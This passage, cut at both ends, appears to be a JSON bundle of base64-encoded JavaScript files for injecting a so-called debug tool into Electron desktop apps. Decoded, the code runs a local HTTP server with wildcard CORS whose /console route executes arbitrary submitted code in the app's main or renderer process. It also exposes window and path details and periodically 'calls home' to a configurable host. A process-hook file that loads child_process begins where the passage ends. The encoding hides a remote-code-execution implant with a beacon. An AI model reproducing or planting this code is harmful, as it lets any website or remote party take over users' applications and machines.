0aHJvdyBuZXcgRXJyb3IoYFJlbmRlcmVyIGVycm9yOiAke3Jlc3VsdC5tZXNzYWdlfWApOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBqb2JNYW5hZ2VyLnNldFJlc3VsdChqb2JJZCwgewogICAgICAgICAgICAgICAgICAgIHN0YXR1czogJ2NvbXBsZXRlZCcsCiAgICAgICAgICAgICAgICAgICAgcmVzdWx0OiByZXN1bHQsCiAgICAgICAgICAgICAgICAgICAgcHJvY2VzczogJ3JlbmRlcmVyJywKICAgICAgICAgICAgICAgICAgICB3aW5kb3dJZDogYWN0aXZlV2luZG93LmlkCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgICAgICAgICAgam9iTWFuYWdlci5zZXRSZXN1bHQoam9iSWQsIHsKICAgICAgICAgICAgICAgICAgICBzdGF0dXM6ICdlcnJvcicsCiAgICAgICAgICAgICAgICAgICAgZXJyb3I6IGVycm9yLm1lc3NhZ2UsCiAgICAgICAgICAgICAgICAgICAgc3RhY2s6IGVycm9yLnN0YWNrLAogICAgICAgICAgICAgICAgICAgIHByb2Nlc3M6ICdyZW5kZXJlcicKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfTsKICAgIAogICAgLy8gQXBwIGluZm8gY29sbGVjdG9yCiAgICBjb25zdCBnZXRBcHBJbmZvID0gKCkgPT4gewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIGNvbnN0IHdpbmRvd3MgPSBCcm93c2VyV2luZG93LmdldEFsbFdpbmRvd3MoKTsKICAgICAgICAgICAgCiAgICAgICAgICAgIHJldHVybiB7CiAgICAgICAgICAgICAgICBhcHA6IHsKICAgICAgICAgICAgICAgICAgICBuYW1lOiBhcHAuZ2V0TmFtZSgpLAogICAgICAgICAgICAgICAgICAgIHZlcnNpb246IGFwcC5nZXRWZXJzaW9uKCksCiAgICAgICAgICAgICAgICAgICAgaXNQYWNrYWdlZDogYXBwLmlzUGFja2FnZWQsCiAgICAgICAgICAgICAgICAgICAgYXBwUGF0aDogYXBwLmdldEFwcFBhdGgoKSwKICAgICAgICAgICAgICAgICAgICB1c2VyRGF0YVBhdGg6IGFwcC5nZXRQYXRoKCd1c2VyRGF0YScpCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgc3lzdGVtOiB7CiAgICAgICAgICAgICAgICAgICAgcGxhdGZvcm06IHByb2Nlc3MucGxhdGZvcm0sCiAgICAgICAgICAgICAgICAgICAgYXJjaDogcHJvY2Vzcy5hcmNoLAogICAgICAgICAgICAgICAgICAgIHZlcnNpb25zOiBwcm9jZXNzLnZlcnNpb25zLAogICAgICAgICAgICAgICAgICAgIHBpZDogcHJvY2Vzcy5waWQsCiAgICAgICAgICAgICAgICAgICAgdXB0aW1lOiBNYXRoLnJvdW5kKHByb2Nlc3MudXB0aW1lKCkpCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgd2luZG93czogd2luZG93cy5tYXAod2luID0+ICh7CiAgICAgICAgICAgICAgICAgICAgaWQ6IHdpbi5pZCwKICAgICAgICAgICAgICAgICAgICB0aXRsZTogd2luLmdldFRpdGxlKCksCiAgICAgICAgICAgICAgICAgICAgdXJsOiB3aW4ud2ViQ29udGVudHM/LmdldFVSTCgpIHx8ICdVbmtub3duJywKICAgICAgICAgICAgICAgICAgICB2aXNpYmxlOiB3aW4uaXNWaXNpYmxlKCksCiAgICAgICAgICAgICAgICAgICAgZm9jdXNlZDogd2luLmlzRm9jdXNlZCgpLAogICAgICAgICAgICAgICAgICAgIGJvdW5kczogd2luLmdldEJvdW5kcygpCiAgICAgICAgICAgICAgICB9KSksCiAgICAgICAgICAgICAgICBkZWJ1ZzogewogICAgICAgICAgICAgICAgICAgIGFjdGl2ZUpvYnM6IGpvYnMuc2l6ZSwKICAgICAgICAgICAgICAgICAgICB0b29sVmVyc2lvbjogJzIuMCcsCiAgICAgICAgICAgICAgICAgICAgc3RhcnRUaW1lOiBEYXRlLm5vdygpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH07CiAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHsKICAgICAgICAgICAgcmV0dXJuIHsKICAgICAgICAgICAgICAgIGVycm9yOiAnRmFpbGVkIHRvIGNvbGxlY3QgYXBwIGluZm8nLAogICAgICAgICAgICAgICAgbWVzc2FnZTogZXJyb3IubWVzc2FnZQogICAgICAgICAgICB9OwogICAgICAgIH0KICAgIH07CiAgICAKICAgIC8vIENhbGwgaG9tZSBmdW5jdGlvbmFsaXR5CiAgICBjb25zdCBjYWxsSG9tZSA9ICgpID0+IHsKICAgICAgICBpZiAoIUNPTkZJRy5FTkFCTEVfQ0FMTF9IT01FKSB7CiAgICAgICAgICAgIGNvbnNvbGUubG9nKCdbREVCVUctVE9PTF0gQ2FsbCBob21lIGRpc2FibGVkIGluIGNvbmZpZycpOwogICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQogICAgICAgIAogICAgICAgIHRyeSB7CiAgICAgICAgICAgIGNvbnN0IHBvc3REYXRhID0gdXRpbHMuc2FmZVN0cmluZ2lmeSh7CiAgICAgICAgICAgICAgICBhcHBfbmFtZTogYXBwLmdldE5hbWUoKSwKICAgICAgICAgICAgICAgIHRpbWVzdGFtcDogRGF0ZS5ub3coKSwKICAgICAgICAgICAgICAgIGFjdGl2ZV9qb2JzOiBqb2JzLnNpemUKICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIAogICAgICAgICAgICBjb25zdCBvcHRpb25zID0gewogICAgICAgICAgICAgICAgaG9zdG5hbWU6IENPTkZJRy5DQUxMX0hPTUVfSE9TVCwKICAgICAgICAgICAgICAgIHBvcnQ6IENPTkZJRy5DQUxMX0hPTUVfUE9SVCwKICAgICAgICAgICAgICAgIHBhdGg6ICcvY2FsbC1ob21lJywKICAgICAgICAgICAgICAgIG1ldGhvZDogJ1BPU1QnLAogICAgICAgICAgICAgICAgaGVhZGVyczogewogICAgICAgICAgICAgICAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicsCiAgICAgICAgICAgICAgICAgICAgJ0NvbnRlbnQtTGVuZ3RoJzogQnVmZmVyLmJ5dGVMZW5ndGgocG9zdERhdGEpCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgdGltZW91dDogNTAwMAogICAgICAgICAgICB9OwogICAgICAgICAgICAKICAgICAgICAgICAgY29uc29sZS5sb2coYFtERUJVRy1UT09MXSBBdHRlbXB0aW5nIGNhbGwgaG9tZSB0byAke0NPTkZJRy5DQUxMX0hPTUVfSE9TVH06JHtDT05GSUcuQ0FMTF9IT01FX1BPUlR9YCk7CiAgICAgICAgICAgIAogICAgICAgICAgICBjb25zdCByZXEgPSBodHRwLnJlcXVlc3Qob3B0aW9ucywgKHJlcykgPT4gewogICAgICAgICAgICAgICAgbGV0IHJlc3BvbnNlRGF0YSA9ICcnOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICByZXMub24oJ2RhdGEnLCAoY2h1bmspID0+IHsKICAgICAgICAgICAgICAgICAgICByZXNwb25zZURhdGEgKz0gY2h1bms7CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgcmVzLm9uKCdlbmQnLCAoKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgaWYgKHJlcy5zdGF0dXNDb2RlID09PSAyMDApIHsKICAgICAgICAgICAgICAgICAgICAgICAgY29uc29sZS5sb2coJ1tERUJVRy1UT09MXSBDYWxsIGhvbWUgc3VjY2Vzc2Z1bCcpOwogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKGBbREVCVUctVE9PTF0gQ2FsbCBob21lIGZhaWxlZCB3aXRoIHN0YXR1czogJHtyZXMuc3RhdHVzQ29kZX1gKTsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHJlc3BvbnNlRGF0YSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29uc29sZS5sb2coYFtERUJVRy1UT09MXSBSZXNwb25zZTogJHtyZXNwb25zZURhdGF9YCk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIAogICAgICAgICAgICByZXEub24oJ2Vycm9yJywgKGVycm9yKSA9PiB7CiAgICAgICAgICAgICAgICBjb25zb2xlLmxvZyhgW0RFQlVHLVRPT0xdIENhbGwgaG9tZSBlcnJvcjogJHtlcnJvci5tZXNzYWdlfWApOwogICAgICAgICAgICAgICAgaWYgKGVycm9yLmNvZGUgPT09ICdFQ09OTlJFRlVTRUQnKSB7CiAgICAgICAgICAgICAgICAgICAgY29uc29sZS5sb2coYFtERUJVRy1UT09MXSBJcyB0aGUgY2FsbC1ob21lIHNlcnZlciBydW5uaW5nIG9uICR7Q09ORklHLkNBTExfSE9NRV9IT1NUfToke0NPTkZJRy5DQUxMX0hPTUVfUE9SVH0/YCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0pOwogICAgICAgICAgICAKICAgICAgICAgICAgcmVxLm9uKCd0aW1lb3V0JywgKCkgPT4gewogICAgICAgICAgICAgICAgY29uc29sZS5sb2coJ1tERUJVRy1UT09MXSBDYWxsIGhvbWUgdGltZWQgb3V0Jyk7CiAgICAgICAgICAgICAgICByZXEuZGVzdHJveSgpOwogICAgICAgICAgICB9KTsKICAgICAgICAgICAgCiAgICAgICAgICAgIHJlcS53cml0ZShwb3N0RGF0YSk7CiAgICAgICAgICAgIHJlcS5lbmQoKTsKICAgICAgICAgICAgCiAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHsKICAgICAgICAgICAgY29uc29sZS5sb2coYFtERUJVRy1UT09MXSBDYWxsIGhvbWUgZXhjZXB0aW9uOiAke2Vycm9yLm1lc3NhZ2V9YCk7CiAgICAgICAgfQogICAgfTsKICAgIAogICAgLy8gSFRUUCBzZXJ2ZXIgc2V0dXAKICAgIGNvbnN0IGNyZWF0ZVNlcnZlciA9ICgpID0+IHsKICAgICAgICBjb25zdCBzZXJ2ZXIgPSBodHRwLmNyZWF0ZVNlcnZlcihhc3luYyAocmVxLCByZXMpID0+IHsKICAgICAgICAgICAgLy8gU2V0IENPUlMgaGVhZGVycwogICAgICAgICAgICByZXMuc2V0SGVhZGVyKCdBY2Nlc3MtQ29udHJvbC1BbGxvdy1PcmlnaW4nLCAnKicpOwogICAgICAgICAgICByZXMuc2V0SGVhZGVyKCdBY2Nlc3MtQ29udHJvbC1BbGxvdy1NZXRob2RzJywgJ0dFVCwgUE9TVCwgT1BUSU9OUycpOwogICAgICAgICAgICByZXMuc2V0SGVhZGVyKCdBY2Nlc3MtQ29udHJvbC1BbGxvdy1IZWFkZXJzJywgJ0NvbnRlbnQtVHlwZScpOwogICAgICAgICAgICByZXMuc2V0SGVhZGVyKCdDb250ZW50LVR5cGUnLCAnYXBwbGljYXRpb24vanNvbicpOwogICAgICAgICAgICAKICAgICAgICAgICAgLy8gSGFuZGxlIHByZWZsaWdodAogICAgICAgICAgICBpZiAocmVxLm1ldGhvZCA9PT0gJ09QVElPTlMnKSB7CiAgICAgICAgICAgICAgICByZXMud3JpdGVIZWFkKDIwMCk7CiAgICAgICAgICAgICAgICByZXMuZW5kKCk7CiAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBjb25zdCB1cmwgPSBuZXcgVVJMKHJlcS51cmwsIGBodHRwOi8vJHtDT05GSUcuREVCVUdfSE9TVH06JHtDT05GSUcuREVCVUdfUE9SVH1gKTsKICAgICAgICAgICAgICAgIGNvbnN0IHBhdGggPSB1cmwucGF0aG5hbWU7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC8vIFJvdXRlOiBHRVQgL2luZm8KICAgICAgICAgICAgICAgIGlmIChyZXEubWV0aG9kID09PSAnR0VUJyAmJiBwYXRoID09PSAnL2luZm8nKSB7CiAgICAgICAgICAgICAgICAgICAgdXRpbHMubG9nUmVxdWVzdCgnR0VUJywgJy9pbmZvJyk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgY29uc3QgaW5mbyA9IGdldEFwcEluZm8oKTsKICAgICAgICAgICAgICAgICAgICByZXMud3JpdGVIZWFkKDIwMCk7CiAgICAgICAgICAgICAgICAgICAgcmVzLmVuZCh1dGlscy5zYWZlU3RyaW5naWZ5KGluZm8pKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgLy8gUm91dGU6IFBPU1QgL2NvbnNvbGUKICAgICAgICAgICAgICAgIGVsc2UgaWYgKHJlcS5tZXRob2QgPT09ICdQT1NUJyAmJiBwYXRoID09PSAnL2NvbnNvbGUnKSB7CiAgICAgICAgICAgICAgICAgICAgbGV0IGJvZHkgPSAnJzsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICByZXEub24oJ2RhdGEnLCBjaHVuayA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgIGJvZHkgKz0gY2h1bmsudG9TdHJpbmcoKTsKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICByZXEub24oJ2VuZCcsIGFzeW5jICgpID0+IHsKICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IHBheWxvYWQgPSBKU09OLnBhcnNlKGJvZHkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBWYWxpZGF0ZSBwYXlsb2FkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoIXBheWxvYWQuZGF0YSB8fCAhcGF5bG9hZC5wcm9jZXNzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVzLndyaXRlSGVhZCg0MDApOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcy5lbmQodXRpbHMuc2FmZVN0cmluZ2lmeSh7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVycm9yOiAnTWlzc2luZyByZXF1aXJlZCBmaWVsZHM6IGRhdGEsIHByb2Nlc3MnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCFbJ21haW4nLCAncmVuZGVyZXInXS5pbmNsdWRlcyhwYXlsb2FkLnByb2Nlc3MpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVzLndyaXRlSGVhZCg0MDApOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcy5lbmQodXRpbHMuc2FmZVN0cmluZ2lmeSh7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVycm9yOiAnUHJvY2VzcyBtdXN0IGJlICJtYWluIiBvciAicmVuZGVyZXIiJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIERlY29kZSBhbmQgY3JlYXRlIGpvYgogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgY29kZSA9IHV0aWxzLmRlY29kZUJhc2U2NChwYXlsb2FkLmRhdGEpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29uc3Qgam9iSWQgPSBqb2JNYW5hZ2VyLmNyZWF0ZShjb2RlLCBwYXlsb2FkLnByb2Nlc3MpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB1dGlscy5sb2dSZXF1ZXN0KCdQT1NUJywgJy9jb25zb2xlJywgam9iSWQpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBSZXR1cm4gam9iIElEIGltbWVkaWF0ZWx5CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXMud3JpdGVIZWFkKDIwMCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXMuZW5kKHV0aWxzLnNhZmVTdHJpbmdpZnkoewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGpvYklkLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0YXR1czogJ3BlbmRpbmcnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByb2Nlc3M6IHBheWxvYWQucHJvY2VzcwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBFeGVjdXRlIGluIGJhY2tncm91bmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNldEltbWVkaWF0ZSgoKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhlY3V0b3JzW3BheWxvYWQucHJvY2Vzc10oY29kZSwgam9iSWQpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcy53cml0ZUhlYWQoNDAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcy5lbmQodXRpbHMuc2FmZVN0cmluZ2lmeSh7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXJyb3I6IGVycm9yLm1lc3NhZ2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAvLyBSb3V0ZTogR0VUIC9yZXN1bHQvOmpvYklkCiAgICAgICAgICAgICAgICBlbHNlIGlmIChyZXEubWV0aG9kID09PSAnR0VUJyAmJiBwYXRoLm1hdGNoKC9eXC9yZXN1bHRcL1thLWYwLTldKyQvKSkgewogICAgICAgICAgICAgICAgICAgIGNvbnN0IGpvYklkID0gcGF0aC5zcGxpdCgnLycpWzJdOwogICAgICAgICAgICAgICAgICAgIHV0aWxzLmxvZ1JlcXVlc3QoJ0dFVCcsIGAvcmVzdWx0LyR7am9iSWR9YCwgam9iSWQpOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGNvbnN0IGpvYiA9IGpvYk1hbmFnZXIuZ2V0QW5kRGVsZXRlKGpvYklkKTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpZiAoIWpvYikgewogICAgICAgICAgICAgICAgICAgICAgICByZXMud3JpdGVIZWFkKDQwNCk7CiAgICAgICAgICAgICAgICAgICAgICAgIHJlcy5lbmQodXRpbHMuc2FmZVN0cmluZ2lmeSh7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlcnJvcjogJ0pvYiBub3QgZm91bmQgb3IgYWxyZWFkeSByZXRyaWV2ZWQnCiAgICAgICAgICAgICAgICAgICAgICAgIH0pKTsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICByZXMud3JpdGVIZWFkKDIwMCk7CiAgICAgICAgICAgICAgICAgICAgcmVzLmVuZCh1dGlscy5zYWZlU3RyaW5naWZ5KHsKICAgICAgICAgICAgICAgICAgICAgICAgam9iSWQ6IGpvYi5pZCwKICAgICAgICAgICAgICAgICAgICAgICAgc3RhdHVzOiBqb2Iuc3RhdHVzLAogICAgICAgICAgICAgICAgICAgICAgICBwcm9jZXNzOiBqb2IucHJvY2VzcywKICAgICAgICAgICAgICAgICAgICAgICAgY3JlYXRlZDogam9iLmNyZWF0ZWQsCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbXBsZXRlZDogam9iLmNvbXBsZXRlZCB8fCBudWxsLAogICAgICAgICAgICAgICAgICAgICAgICByZXN1bHQ6IGpvYi5yZXN1bHQgfHwgbnVsbCwKICAgICAgICAgICAgICAgICAgICAgICAgZXJyb3I6IGpvYi5lcnJvciB8fCBudWxsLAogICAgICAgICAgICAgICAgICAgICAgICBzdGFjazogam9iLnN0YWNrIHx8IG51bGwsCiAgICAgICAgICAgICAgICAgICAgICAgIHdpbmRvd0lkOiBqb2Iud2luZG93SWQgfHwgbnVsbAogICAgICAgICAgICAgICAgICAgIH0pKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgLy8gUm91dGU6IFVua25vd24KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgIHJlcy53cml0ZUhlYWQoNDA0KTsKICAgICAgICAgICAgICAgICAgICByZXMuZW5kKHV0aWxzLnNhZmVTdHJpbmdpZnkoewogICAgICAgICAgICAgICAgICAgICAgICBlcnJvcjogJ05vdCBmb3VuZCcsCiAgICAgICAgICAgICAgICAgICAgICAgIGF2YWlsYWJsZVJvdXRlczogWwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ0dFVCAvaW5mbycsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnUE9TVCAvY29uc29sZScsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnR0VUIC9yZXN1bHQvOmpvYklkJwogICAgICAgICAgICAgICAgICAgICAgICBdCiAgICAgICAgICAgICAgICAgICAgfSkpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgICAgICAgICBjb25zb2xlLmVycm9yKCdbREVCVUctVE9PTF0gUmVxdWVzdCBlcnJvcjonLCBlcnJvcik7CiAgICAgICAgICAgICAgICByZXMud3JpdGVIZWFkKDUwMCk7CiAgICAgICAgICAgICAgICByZXMuZW5kKHV0aWxzLnNhZmVTdHJpbmdpZnkoewogICAgICAgICAgICAgICAgICAgIGVycm9yOiAnSW50ZXJuYWwgc2VydmVyIGVycm9yJwogICAgICAgICAgICAgICAgfSkpOwogICAgICAgICAgICB9CiAgICAgICAgfSk7CiAgICAgICAgCiAgICAgICAgcmV0dXJuIHNlcnZlcjsKICAgIH07CiAgICAKICAgIC8vIEluaXRpYWxpemUgdGhlIGRlYnVnIHRvb2wKICAgIGNvbnN0IGluaXRpYWxpemUgPSAoKSA9PiB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgY29uc3Qgc2VydmVyID0gY3JlYXRlU2VydmVyKCk7CiAgICAgICAgICAgIAogICAgICAgICAgICBzZXJ2ZXIubGlzdGVuKENPTkZJRy5ERUJVR19QT1JULCBDT05GSUcuREVCVUdfSE9TVCwgKCkgPT4gewogICAgICAgICAgICAgICAgY29uc29sZS5sb2coYFtERUJVRy1UT09MXSBTZXJ2ZXIgbGlzdGVuaW5nIG9uIGh0dHA6Ly8ke0NPTkZJRy5ERUJVR19IT1NUfToke0NPTkZJRy5ERUJVR19QT1JUfWApOwogICAgICAgICAgICAgICAgY29uc29sZS5sb2coYFtERUJVRy1UT09MXSBBdmFpbGFibGUgZW5kcG9pbnRzOmApOwogICAgICAgICAgICAgICAgY29uc29sZS5sb2coYFtERUJVRy1UT09MXSAgIEdFVCAgL2luZm8gLSBBcHBsaWNhdGlvbiBpbmZvcm1hdGlvbmApOwogICAgICAgICAgICAgICAgY29uc29sZS5sb2coYFtERUJVRy1UT09MXSAgIFBPU1QgL2NvbnNvbGUgLSBFeGVjdXRlIGNvZGUgKGRhdGE6IGJhc2U2NCwgcHJvY2VzczogbWFpbnxyZW5kZXJlcilgKTsKICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKGBbREVCVUctVE9PTF0gICBHRVQgIC9yZXN1bHQvOmpvYklkIC0gUmV0cmlldmUgZXhlY3V0aW9uIHJlc3VsdHNgKTsKICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIAogICAgICAgICAgICBzZXJ2ZXIub24oJ2Vycm9yJywgKGVycm9yKSA9PiB7CiAgICAgICAgICAgICAgICBjb25zb2xlLmVycm9yKCdbREVCVUctVE9PTF0gU2VydmVyIGVycm9yOicsIGVycm9yKTsKICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIAogICAgICAgICAgICAvLyBTZXQgdXAgcGVyaW9kaWMgY2xlYW51cAogICAgICAgICAgICBzZXRJbnRlcnZhbChqb2JNYW5hZ2VyLmNsZWFudXAsIDYwMDAwKTsgLy8gRXZlcnkgbWludXRlCiAgICAgICAgICAgIAogICAgICAgICAgICAvLyBTZXQgdXAgY2FsbCBob21lIGlmIGVuYWJsZWQKICAgICAgICAgICAgaWYgKENPTkZJRy5FTkFCTEVfQ0FMTF9IT01FKSB7CiAgICAgICAgICAgICAgICBzZXRJbnRlcnZhbChjYWxsSG9tZSwgQ09ORklHLkNBTExfSE9NRV9JTlRFUlZBTCk7CiAgICAgICAgICAgICAgICBzZXRUaW1lb3V0KGNhbGxIb21lLCA1MDAwKTsgLy8gSW5pdGlhbCBjYWxsIGFmdGVyIDUgc2Vjb25kcwogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICBjb25zb2xlLmxvZygnW0RFQlVHLVRPT0xdIEluaXRpYWxpemF0aW9uIGNvbXBsZXRlJyk7CiAgICAgICAgICAgIAogICAgICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoJ1tERUJVRy1UT09MXSBJbml0aWFsaXphdGlvbiBmYWlsZWQ6JywgZXJyb3IpOwogICAgICAgIH0KICAgIH07CiAgICAKICAgIC8vIFN0YXJ0IHdoZW4gYXBwIGlzIHJlYWR5CiAgICBpZiAoYXBwLmlzUmVhZHkoKSkgewogICAgICAgIGluaXRpYWxpemUoKTsKICAgIH0gZWxzZSB7CiAgICAgICAgYXBwLm9uY2UoJ3JlYWR5JywgKCkgPT4gewogICAgICAgICAgICBzZXRUaW1lb3V0KGluaXRpYWxpemUsIDEwMDApOwogICAgICAgIH0pOwogICAgfQogICAgCn0pKCk7Cg==","process-hook.js":"KGZ1bmN0aW9uKCkgewogICAgdHJ5IHsKICAgICAgICBjb25zdCB7IGFwcCB9ID0gcmVxdWlyZSgnZWxlY3Ryb24nKTsKICAgICAgICBjb25zdCBjaGlsZFByb2Nlc3MgPSByZXF1aXJlKCdjaGlsZF9wcm9jZXNzJyk7CiAgICAgICAgY29uc3QgZnMgPSByZXF1aXJlKCdmcycpOwogICAgICAgIGNvbnN0IHBhdGggPSByZXF1aXJlKCdwYXRoJyk7CiAgICAgICAgY29uc3Qgb3MgPSByZXF1aXJlKCdvcycpOwogICAgICAgIAogICAgICAgIC8vIFNhZmUgbG9nZ2luZyBmdW5jdGlvbiB3aXRoIGVycm9yIGhhbmRsaW5nCiAgICAgICAgZnVuY3Rpb24gbG9nKGRhdGEpIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIGNvbnN0IGxvZ0RpciA9IHBhdGguam9pbihvcy5ob21lZGlyKCksICcubG9jYWwnLCAnaGFkcm9uJywgJ2xvZ3MnKTsKICAgICAgICAgICAgICAgIGNvbnN0IGxvZ0ZpbGUgPSBwYXRoLmpvaW4obG9nRGlyLCAncHJvY2Vzcy5qc29uJyk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC8vIEVuc3VyZSBkaXJlY3RvcnkgZXhpc3RzCiAgICAgICAgICAgICAgICBpZiAoIWZzLmV4aXN0c1N5bmMobG9nRGlyKSkgewogICAgICAgICAgICAgICAgICAgIGZzLm1rZGlyU3luYyhsb2dEaXIsIHsgcmVjdXJzaXZlOiB0cnVlIH0pOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAvLyBQcmVwYXJlIGxvZyBlbnRyeSB3aXRoIHRpbWVzdGFtcAogICAgICAgICAgICAgICAgY29uc3QgbG9nRW50cnkgPSB7CiAgICAgICAgICAgICAgICAgICAgdGltZXN0YW1wOiBuZXcgRGF0ZSgpLnRvSVNPU3RyaW5nKCksCiAgICAgICAgICAgICAgICAgICAgLi4uZGF0YQogICAgICAgICAgICAgICAgfTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgLy8gVXNlIGFwcGVuZC1vbmx5IGxvZ2dpbmcgdG8gcHJldmVudCBmaWxlIGNvcnJ1cHRpb24KICAgICAgICAgICAgICAgIGNvbnN0IGxvZ0xpbmUgPSBKU09OLnN0cmluZ2lmeShsb2dFbnRyeSkgKyAnXG4nOwogICAgICAgICAgICAgICAgZnMuYXBwZW5kRmlsZVN5bmMobG9nRmlsZSwgbG9nTGluZSk7CiAgICAgICAgICAgICAgI